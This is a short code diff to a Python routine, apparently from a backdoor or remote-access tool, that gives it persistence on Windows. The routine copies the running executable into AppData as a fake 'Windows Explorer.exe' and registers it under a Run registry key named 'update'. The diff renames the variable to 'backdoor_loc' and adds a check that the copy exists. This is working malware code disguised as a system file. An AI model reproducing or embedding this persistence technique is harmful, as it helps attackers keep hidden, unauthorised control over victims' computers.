@@ -26,10 +26,11 @@ import subprocess
 def execute_on_startup():
     try:
         if(platform.system() == "Windows"):
-            evil_file_loc = os.environ["appdata"] + "\\Windows Explorer.exe"
-            shutil.copyfile(sys.executable, evil_file_loc)
-            sys_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d '" + evil_file_loc + "'"
-            result = execute_system_command(sys_command)
+            backdoor_loc = os.environ["appdata"] + "\\Windows Explorer.exe"
+            if(not os.path.exists(backdoor_loc)):
+                shutil.copyfile(sys.executable, backdoor_loc)
+                sys_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d '" + backdoor_loc + "'"
+                result = execute_system_command(sys_command)
     
     except:
         pass
